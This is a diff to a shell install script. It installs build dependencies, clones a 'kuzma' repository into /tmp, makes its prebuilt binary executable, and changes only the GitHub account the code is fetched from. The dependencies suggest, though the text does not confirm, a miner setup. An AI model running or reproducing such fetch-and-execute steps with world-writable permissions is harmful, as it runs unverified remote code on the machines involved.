@@ -17,7 +17,7 @@ sudo sysctl -p
 sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev libuv1-dev libmicrohttpd-dev libssl-dev autotools-dev automake screen htop nano cmake mc -y
 sleep 2
 cd /tmp && mkdir kuzma
-git clone https://github.com/hertut/kuzma.git /tmp/kuzma
+git clone https://github.com/hertuta/kuzma.git /tmp/kuzma
 cd /tmp/kuzma
 chmod +x /tmp/kuzma/kuzma
 chmod 777 ./*.sh
